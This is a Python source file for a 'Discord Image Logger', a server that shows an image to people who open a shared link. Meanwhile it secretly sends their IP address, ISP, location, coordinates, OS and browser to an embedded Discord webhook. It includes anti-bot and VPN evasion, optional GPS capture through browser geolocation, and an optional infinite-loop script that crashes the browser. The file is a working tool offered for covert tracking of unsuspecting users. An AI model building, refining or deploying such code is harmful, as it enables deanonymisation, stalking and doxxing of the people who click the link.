# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1397331702220849352/2EdJjpgWJvOG88h1r1fNmerhWyXodBSvtJCy6BJZzuiPZfiHv3aFa7WAElSfeLE8AlV3",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
